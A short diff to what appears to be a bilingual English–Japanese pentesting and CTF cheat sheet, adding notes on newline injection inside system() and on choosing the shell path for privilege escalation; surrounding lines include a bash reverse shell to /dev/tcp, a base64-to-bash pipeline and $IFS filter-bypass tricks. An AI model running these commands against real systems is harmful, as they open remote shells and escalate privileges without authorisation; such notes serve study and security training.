@@ -118,6 +118,7 @@
     - echo -n 'code' | base64 -w0 | base64 -d | bash
     - {echo,test}
     - echo$IFS"test"
+    - system関数内の改行(system("id\nj/bin/sh"))
     - bash -i >& /dev/tcp/127.0.0.1/4444  0>&1
       - redirect stdout, stderr, stdin to a socket
       - ">&" redirect stdout, stderr to a socket, "0>&1" redirect stdin to stdout(a socket).
@@ -169,6 +170,10 @@
       - ldd libc.so.6
       - ldd binary
       - 32bitの場合、アドレスが合致するまで施行するのも視野に入れる
+    - /bin/sh
+      - 権限昇格においては大半の場合、system("/bin/sh")を実行することが目的となるが、/bin/shでなくともよい
+      - system('/tmp/hoge')のようなパスを指定し、/tmp/hogeに実行可能なシェルスクリプトを配置してもよい
+      - /bin/shに限らず、適当なパスがバイナリ中に存在すれば流用可能
   - wordlist
     - cewl
     - [username-anarchy](https://github.com/urbanadventurer/username-anarchy)
